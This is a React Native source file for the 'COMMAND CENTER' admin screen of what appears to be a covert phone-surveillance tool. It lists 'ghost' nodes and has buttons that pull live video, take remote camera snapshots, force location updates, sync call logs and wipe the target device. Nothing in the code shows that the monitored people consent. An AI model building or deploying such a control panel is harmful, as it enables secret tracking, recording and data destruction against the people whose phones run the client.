import React, { useState, useEffect, useRef } from 'react';
import { View, ScrollView, StyleSheet, Text, Vibration, SafeAreaView, StatusBar, TouchableOpacity, ActivityIndicator, Alert } from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';
import { captureRef } from 'react-native-view-shot';
import * as MediaLibrary from 'expo-media-library';
import socket from '../services/socket';

// Import Child Components
import StatusCard from '../components/StatusCard';
import VideoFeed from '../components/VideoFeed';
import LogConsole from '../components/LogConsole';
import TacticalMap from '../components/TacticalMap';
import SnapshotGallery from '../components/SnapshotGallery';
import CallLogViewer from '../components/CallLogViewer';

const AdminScreen = ({ onLogout, name }) => {
  const [ghosts, setGhosts] = useState({});
  const [logs, setLogs] = useState([]);
  const [selectedGhostId, setSelectedGhostId] = useState(null);
  const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
  const [isCapturing, setIsCapturing] = useState(false);
  const viewRef = useRef();
  const feedRef = useRef();
  const heartbeatCache = useRef({});

  const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;

  useEffect(() => {
    socket.on('heartbeat_update', (data) => {
      heartbeatCache.current[data.name] = { ...data, lastSeen: Date.now() };
    });

    const syncInterval = setInterval(() => {
      if (Object.keys(heartbeatCache.current).length > 0) {
        setGhosts(prev => {
          const newState = { ...prev };
          Object.keys(heartbeatCache.current).forEach(node => {
            newState[node] = { ...prev[node], ...heartbeatCache.current[node] };
          });
          heartbeatCache.current = {}; 
          return newState;
        });
      }
    }, 800); 
    
    socket.on('status_report', (data) => {
      console.log("[Admin] Received Status Report", data);
      const initialGhosts = {};
      data.nodes.forEach(node => {
        initialGhosts[node.name] = { 
          ...node, 
          status: node.status || (node.socketId ? 'CONNECTED' : 'OFFLINE'),
          lastSeen: node.lastSeen || Date.now() 
        };
      });
      setGhosts(prev => ({ ...prev, ...initialGhosts }));
    });

    socket.on('system_alert', (data) => {
      setLogs(prev => [...prev, { 
        type: 'SYSTEM', 
        message: data.msg || 'ALERT', 
        timestamp: new Date().toLocaleTimeString() 
      }].slice(-50));
    });

    // Request full status on entry
    socket.emit('get_status');
    setLogs(prev => [...prev, { 
      type: 'SYSTEM', 
      message: 'COMMAND CENTER INITIALIZED. SCANNING NODES...', 
      timestamp: new Date().toLocaleTimeString() 
    }]);

    socket.on('log_update', (newLog) => {
      const logWithTime = {
        ...newLog,
        timestamp: newLog.timestamp || new Date().toLocaleTimeString()
      };
      setLogs(prev => [...prev, logWithTime].slice(-50));
      if (newLog.type === 'ERROR') Vibration.vibrate([0, 150, 100, 150]); 
    });

    socket.on('ghost_activity', (payload) => {
      if (payload.type === 'SNAPSHOT') {
        setGhosts(prev => ({
          ...prev,
          [payload.name]: {
            ...prev[payload.name],
            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[payload.name]?.snapshots || [])]
          }
        }));
        setLogs(prev => [...prev, { 
          type: 'SYSTEM', 
          message: `SNAPSHOT RECEIVED FROM ${payload.name}`, 
          timestamp: new Date().toLocaleTimeString() 
        }]);
      } else if (payload.type === 'LOG_SYNC') {
        setGhosts(prev => ({
          ...prev,
          [payload.name]: {
            ...prev[payload.name],
            callLogs: payload.data
          }
        }));
        setLogs(prev => [...prev, { 
          type: 'SYSTEM', 
          message: `TELEMETRY SYNCED FROM ${payload.name}`, 
          timestamp: new Date().toLocaleTimeString() 
        }]);
      }
    });

    return () => {
      clearInterval(syncInterval);
      socket.off('heartbeat_update');
      socket.off('log_update');
      socket.off('ghost_activity');
      socket.off('status_report');
      socket.off('system_alert');
    };
  }, []);

  const sendCommand = (target, cmd) => {
    socket.emit('admin_command', { targetId: target, cmd });
    Vibration.vibrate(50);
  };

  const getFormattedTimestamp = () => {
    const now = new Date();
    const pad = (n) => n.toString().padStart(2, '0');
    return `${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}_${pad(now.getDate())}${pad(now.getMonth() + 1)}${now.getFullYear().toString().slice(-2)}`;
  };

  const captureLocalView = async (targetRef, typeLabel = "DASHBOARD") => {
    if (isCapturing) return;

    try {
      setIsCapturing(true); 
      const { status } = await MediaLibrary.requestPermissionsAsync();
      if (status !== 'granted') {
        Alert.alert("Permission Error", "Storage access required to save screenshot.");
        return;
      }

      const captureTarget = (targetRef && targetRef.current) ? targetRef : viewRef;
      const uri = await captureRef(captureTarget, {
        format: 'jpg',
        quality: 0.95,
      });

      const nodeInfo = selectedGhost ? selectedGhost.name.replace(/[^a-z0-9]/gi, '_').toUpperCase() : 'NONE';
      const filename = `${typeLabel}_${nodeInfo}_${getFormattedTimestamp()}.jpg`;
      
      const asset = await MediaLibrary.createAssetAsync(uri);
      await MediaLibrary.createAlbumAsync('JOYJET_SCREENSHOTS', asset, false);
      
      Vibration.vibrate([0, 50, 50, 50]);
      Alert.alert(`SUCCESS`, `Preserved as: ${filename}`);
      
      setTimeout(() => setIsCapturing(false), 2000); 
    } catch (e) {
      console.error("Local capture failed", e);
      Alert.alert("Error", "Feed capture failed. Ensure stream is active.");
      setIsCapturing(false);
    }
  };

  const renderContent = () => {
    switch (activeTab) {
      case 'FEED':
        return (
          <View style={styles.tabSection}>
            <View style={styles.card}>
              <View style={styles.cardHeader}>
                <Text style={styles.sectionLabel}>LIVE INTELLIGENCE STREAM</Text>
                <View style={styles.liveBadge}><Text style={styles.liveBadgeText}>LIVE</Text></View>
              </View>
              
              <View ref={feedRef} collapsable={false} style={styles.feedWrapper}>
                <VideoFeed ghostName={selectedGhost.name} adminName={name} />
              </View>

              <View style={styles.controls}>
                <TouchableOpacity 
                  style={[styles.primaryBtn, isCapturing && styles.disabledBtn]} 
                  onPress={() => captureLocalView(feedRef, "FEED")}
                  disabled={isCapturing}
                >
                  <MaterialCommunityIcons name="monitor-screenshot" size={20} color="#0F172A" style={{ marginRight: 8 }} />
                  <Text style={styles.primaryBtnTxt}>{isCapturing ? "PRESERVING..." : "CAPTURE FEED"}</Text>
                </TouchableOpacity>
                <View style={styles.rowControls}>
                  <TouchableOpacity style={[styles.secondaryBtn, {flex: 1, marginRight: 8}]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
                    <MaterialCommunityIcons name="camera-iris" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
                    <Text style={styles.secondaryBtnTxt}>REMOTE SNAP</Text>
                  </TouchableOpacity>

                  <TouchableOpacity style={[styles.dangerBtn, {flex: 1}]} onPress={() => sendCommand(selectedGhost.name, 'WIPE')}>
                    <MaterialCommunityIcons name="alert-octagon" size={20} color="#EF4444" style={{ marginRight: 8 }} />
                    <Text style={styles.dangerBtnTxt}>WIPE NODE</Text>
                  </TouchableOpacity>
                </View>
              </View>
            </View>
          </View>
        );
      case 'MAP':
        return (
          <View style={styles.tabSection}>
            <View style={styles.card}>
              <View style={styles.cardHeader}>
                <Text style={styles.sectionLabel}>GEOLOCATION TRACKING</Text>
              </View>
              <TacticalMap location={selectedGhost.location} ghostName={selectedGhost.name} />
              <TouchableOpacity style={[styles.secondaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'PING')}>
                <MaterialCommunityIcons name="radar" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
                <Text style={styles.secondaryBtnTxt}>FORCE UPDATE LOCATION</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 'SNAPS':
        return (
          <View style={styles.tabSection}>
            <View style={styles.card}>
              <View style={styles.cardHeader}>
                <Text style={styles.sectionLabel}>EVIDENCE GALLERY</Text>
              </View>
              <SnapshotGallery ghostName={selectedGhost.name} snapshots={selectedGhost.snapshots || []} />
              <TouchableOpacity style={[styles.primaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
                <MaterialCommunityIcons name="camera-plus" size={20} color="#0F172A" style={{ marginRight: 8 }} />
                <Text style={styles.primaryBtnTxt}>REQUEST NEW REMOTE CAPTURE</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 'CALLS':
        return (
          <View style={styles.tabSection}>
            <View style={styles.card}>
              <CallLogViewer logs={selectedGhost.callLogs || []} />
              <TouchableOpacity style={[styles.secondaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
                <MaterialCommunityIcons name="sync" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
                <Text style={styles.secondaryBtnTxt}>FORCE SYNC TELEMETRY</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 'LOGS':
        return (
          <View style={styles.tabSection}>
            <View style={[styles.card, { height: 450 }]}>
                <LogConsole logs={logs.filter(l => l.message.includes(selectedGhost.name) || l.type === 'SYSTEM')} />
            </View>
          </View>
        );
      default:
        return null;
    }
  };

  return (
    <SafeAreaView style={styles.container} ref={viewRef} collapsable={false}>
      <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
      
      {/* HEADER */}
      <View style={styles.header}>
        <View style={styles.headerLeft}>
          <View style={styles.logoIcon}>
            <MaterialCommunityIcons name="shield-check" size={20} color="#38BDF8" />
          </View>
          <View>
            <Text style={styles.headerTitle}>COMMAND CENTER</Text>
            <Text style={styles.headerSubtitle}>SECURE DIRECT CONNECT</Text>
          </View>
        </View>
        <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
          <MaterialCommunityIcons name="logout-variant" size={16} color="#EF4444" style={{marginRight: 6}} />
          <Text style={styles.logoutTxt}>DISCONNECT</Text>
        </TouchableOpacity>
      </View>

      {/* GHOST SELECTOR */}
      <View style={styles.selectorContainer}>
        <Text style={styles.sectionHeading}>ACTIVE NODES</Text>
        <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.selectorScroll}>
          {Object.values(ghosts).length === 0 ? (
            <View style={styles.emptyGhostContainer}>
              <ActivityIndicator color="#64748B" size="small" style={{marginRight: 8}} />
              <Text style={styles.emptyText}>SCANNING FOR SIGNALS...</Text>
            </View>
          ) : (
            Object.values(ghosts).map((ghost) => {
              const isActive = ghost.status === 'CONNECTED' || ghost.status === 'OPTIMIZED';
              const isOffline = ghost.status === 'OFFLINE';
              
              return (
                <TouchableOpacity 
                  key={ghost.name} 
                  style={[
                    styles.selectorChip, 
                    selectedGhostId === ghost.name && styles.selectorChipActive,
                    isOffline && styles.selectorChipOffline
                  ]}
                  onPress={() => setSelectedGhostId(ghost.name)}
                >
                  <MaterialCommunityIcons 
                    name={isOffline ? "lan-disconnect" : (isActive ? "lan-check" : "lan-pending")} 
                    size={14} 
                    color={isActive ? "#10B981" : (isOffline ? "#EF4444" : "#F59E0B")} 
                    style={{ marginRight: 6 }} 
                  />
                  <Text style={[
                    styles.selectorText, 
                    selectedGhostId === ghost.name && styles.selectorTextActive,
                    isOffline && styles.selectorTextOffline
                  ]}>
                    {ghost.name?.split('_').pop()?.toUpperCase() || 'NODE'}
                  </Text>
                </TouchableOpacity>
              );
            })
          )}
        </ScrollView>
      </View>

      {selectedGhost ? (
        <>
          {/* TAB NAVIGATION */}
          <View style={styles.tabBar}>
            <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.tabScroll}>
              {[
                { id: 'FEED', icon: 'cctv' },
                { id: 'MAP', icon: 'map-marker-radius' },
                { id: 'SNAPS', icon: 'image-multiple' },
                { id: 'CALLS', icon: 'phone-log' },
                { id: 'LOGS', icon: 'console-line' }
              ].map(tab => (
                <TouchableOpacity 
                  key={tab.id} 
                  style={[styles.tab, activeTab === tab.id && styles.tabActive]}
                  onPress={() => setActiveTab(tab.id)}
                >
                  <MaterialCommunityIcons 
                    name={tab.icon} 
                    size={18} 
                    color={activeTab === tab.id ? '#38BDF8' : '#64748B'} 
                    style={{ marginBottom: 4 }} 
                  />
                  <Text style={[styles.tabText, activeTab === tab.id && styles.tabTextActive]}>{tab.id}</Text>
                </TouchableOpacity>
              ))}
            </ScrollView>
          </View>

          {/* TAB CONTENT */}
          <ScrollView style={styles.content} showsVerticalScrollIndicator={false}>
            {/* Vitals Overview */}
            <View style={styles.vitalsContainer}>
              <View style={styles.vitalLeft}>
                <MaterialCommunityIcons name="cellphone-link" size={24} color="#F8FAFC" style={{marginRight: 10}} />
                <View>
                  <Text style={styles.ghostIdText}>{selectedGhost?.name.toUpperCase()}</Text>
                  <Text style={styles.vitalSub}>NODE ID • SECURE</Text>
                </View>
              </View>
              <StatusCard 
                battery={selectedGhost?.battery || '--%'} 
                connection={selectedGhost?.status || 'UNKNOWN'}
                isCharging={selectedGhost?.isCharging} 
              />
            </View>

            {renderContent()}

            <View style={{ height: 40 }} />
          </ScrollView>
        </>
      ) : (
        <View style={styles.initOverlay}>
          <View style={styles.placeholderCard}>
            {Object.keys(ghosts).length === 0 ? (
              <>
                <View style={styles.iconCirclePulse}>
                  <ActivityIndicator color="#38BDF8" size="large" />
                </View>
                <Text style={styles.initTitle}>AWAITING CONNECTIONS</Text>
                <Text style={styles.initDesc}>No ghost nodes are currently active. Ensure the client applications are running and connected to the network.</Text>
              </>
            ) : (
              <>
                <View style={[styles.iconCirclePulse, { backgroundColor: 'rgba(16, 185, 129, 0.1)', borderColor: 'rgba(16, 185, 129, 0.3)' }]}>
                  <MaterialCommunityIcons name="gesture-tap" size={48} color="#10B981" />
                </View>
                <Text style={styles.initTitle}>SELECT A NODE</Text>
                <Text style={styles.initDesc}>Tap on any active node from the sequence above to start monitoring its secure stream and telemetry.</Text>
              </>
            )}
            
            <View style={styles.logPreviewBox}>
              <LogConsole logs={logs} />
            </View>
          </View>
        </View>
      )}
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0F172A' },
  
  // Header
  header: { 
    paddingTop: 50, 
    paddingBottom: 16, 
    paddingHorizontal: 20, 
    flexDirection: 'row', 
    justifyContent: 'space-between', 
    alignItems: 'center', 
    backgroundColor: '#1E293B', 
    borderBottomWidth: 1, 
    borderBottomColor: '#334155' 
  },
  headerLeft: { flexDirection: 'row', alignItems: 'center' },
  logoIcon: { width: 36, height: 36, borderRadius: 8, backgroundColor: '#0F172A', justifyContent: 'center', alignItems: 'center', marginRight: 12, borderWidth: 1, borderColor: '#334155' },
  headerTitle: { color: '#F8FAFC', fontSize: 16, fontWeight: '800', letterSpacing: 1 },
  headerSubtitle: { color: '#38BDF8', fontSize: 10, fontWeight: '600', letterSpacing: 1.5, marginTop: 2 },
  
  logoutBtn: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 12, paddingVertical: 8, backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)', borderRadius: 20 },
  logoutTxt: { color: '#EF4444', fontSize: 10, fontWeight: '700', letterSpacing: 1 },
  
  // Ghost Selector
  selectorContainer: { backgroundColor: '#0B0F19', borderBottomWidth: 1, borderBottomColor: '#1E293B', paddingVertical: 12 },
  sectionHeading: { color: '#64748B', fontSize: 10, fontWeight: '700', letterSpacing: 1.5, marginLeft: 20, marginBottom: 8 },
  selectorScroll: { paddingHorizontal: 20, gap: 12 },
  emptyGhostContainer: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#1E293B', paddingHorizontal: 16, paddingVertical: 10, borderRadius: 24, borderWidth: 1, borderColor: '#334155' },
  emptyText: { color: '#94A3B8', fontSize: 11, fontWeight: '600', letterSpacing: 1 },
  
  selectorChip: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 16, paddingVertical: 10, backgroundColor: '#1E293B', borderWidth: 1, borderColor: '#334155', borderRadius: 24, shadowColor: '#000', shadowOffset: {width:0, height:2}, shadowOpacity: 0.2, shadowRadius: 3, elevation: 3 },
  selectorChipActive: { borderColor: '#38BDF8', backgroundColor: 'rgba(56, 189, 248, 0.1)' },
  selectorText: { color: '#94A3B8', fontSize: 12, fontWeight: '700', letterSpacing: 0.5 },
  selectorTextActive: { color: '#38BDF8' },
  
  dot: { width: 8, height: 8, borderRadius: 4, marginRight: 10 },
  dotGreen: { backgroundColor: '#10B981', shadowColor: '#10B981', shadowOffset: {width:0, height:0}, shadowOpacity: 0.8, shadowRadius: 4, elevation: 4 },
  dotOrange: { backgroundColor: '#F59E0B' },
  dotRed: { backgroundColor: '#EF4444' },
  
  selectorChipOffline: { borderColor: '#1E293B', backgroundColor: '#0F172A', opacity: 0.6 },
  selectorTextOffline: { color: '#64748B' },

  // Tabs
  tabBar: { backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
  tabScroll: { flexDirection: 'row' },
  tab: { flex: 1, minWidth: 80, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
  tabActive: { borderBottomColor: '#38BDF8' },
  tabText: { color: '#64748B', fontSize: 10, fontWeight: '700', letterSpacing: 1 },
  tabTextActive: { color: '#38BDF8' },

  // Content
  content: { flex: 1 },
  vitalsContainer: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', padding: 16, backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
  vitalLeft: { flexDirection: 'row', alignItems: 'center' },
  ghostIdText: { color: '#F8FAFC', fontSize: 14, fontWeight: '800', letterSpacing: 1 },
  vitalSub: { color: '#64748B', fontSize: 10, fontWeight: '600', letterSpacing: 1, marginTop: 2 },
  
  tabSection: { padding: 16 },
  
  // Cards
  card: { backgroundColor: '#1E293B', borderRadius: 16, padding: 16, borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.2, shadowRadius: 8, elevation: 5 },
  cardHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 },
  sectionLabel: { color: '#94A3B8', fontSize: 11, fontWeight: '700', letterSpacing: 1.5 },
  liveBadge: { backgroundColor: 'rgba(239, 68, 68, 0.1)', paddingHorizontal: 8, paddingVertical: 4, borderRadius: 12, borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)' },
  liveBadgeText: { color: '#EF4444', fontSize: 9, fontWeight: '800', letterSpacing: 1 },
  
  feedWrapper: { borderRadius: 12, overflow: 'hidden', backgroundColor: '#0F172A', borderWidth: 1, borderColor: '#334155' },
  
  // Controls
  controls: { marginTop: 16, gap: 12 },
  rowControls: { flexDirection: 'row', justifyContent: 'space-between' },
  
  primaryBtn: { height: 50, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 25, backgroundColor: '#38BDF8', shadowColor: '#38BDF8', shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.3, shadowRadius: 8, elevation: 4 },
  primaryBtnTxt: { color: '#0F172A', fontSize: 12, fontWeight: '800', letterSpacing: 1.5 },
  disabledBtn: { backgroundColor: '#64748B', shadowOpacity: 0 },
  
  secondaryBtn: { height: 46, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 23, backgroundColor: 'rgba(56, 189, 248, 0.1)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.3)' },
  secondaryBtnTxt: { color: '#38BDF8', fontSize: 11, fontWeight: '700', letterSpacing: 1 },
  
  dangerBtn: { height: 46, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 23, backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)' },
  dangerBtnTxt: { color: '#EF4444', fontSize: 11, fontWeight: '700', letterSpacing: 1 },
  
  // Init Overlay
  initOverlay: { flex: 1, padding: 20, justifyContent: 'center' },
  placeholderCard: { backgroundColor: '#1E293B', borderRadius: 20, padding: 24, alignItems: 'center', borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: { width: 0, height: 8 }, shadowOpacity: 0.3, shadowRadius: 12, elevation: 10 },
  iconCirclePulse: { width: 80, height: 80, borderRadius: 40, backgroundColor: 'rgba(56, 189, 248, 0.1)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.3)', justifyContent: 'center', alignItems: 'center', marginBottom: 20 },
  initTitle: { color: '#F8FAFC', fontSize: 18, fontWeight: '800', letterSpacing: 1.5, marginBottom: 8, textAlign: 'center' },
  initDesc: { color: '#94A3B8', fontSize: 13, textAlign: 'center', lineHeight: 20, marginBottom: 24, paddingHorizontal: 10 },
  logPreviewBox: { height: 200, width: '100%', borderRadius: 12, overflow: 'hidden', borderWidth: 1, borderColor: '#334155' }
});

export default AdminScreen;
